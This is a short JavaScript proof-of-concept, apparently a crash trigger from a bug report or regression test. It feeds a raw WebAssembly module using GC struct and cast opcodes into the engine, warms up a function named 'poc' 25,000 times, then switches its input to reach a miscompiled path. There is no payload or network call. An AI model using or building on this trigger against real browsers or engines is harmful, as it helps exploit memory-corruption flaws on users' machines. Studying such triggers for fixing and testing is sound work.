const bytes = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 9, 2, 95, 1, 127, 0, 96, 1, 127, 1, 127, 3, 2, 1, 1, 7, 8, 1, 4, 109, 97, 105, 110, 0, 0, 10, 16, 1, 14, 0, 65, 42, 251, 11, 0, 208, 0, 32, 0, 28, 1, 107, 0, 251, 12, 0, 0, 11]);
const module = new WebAssembly.Module(bytes);
const instance = new WebAssembly.Instance(module);
const main = instance.exports.main;

let trigger = false;

function poc() {
    let param = 1;
    if (trigger) {
        param = 0;
    }
    try {
        main(param);
    } catch (e) {}
}

for (let i = 0; i < 25000; ++i) {
    poc();
}

trigger = true;
poc();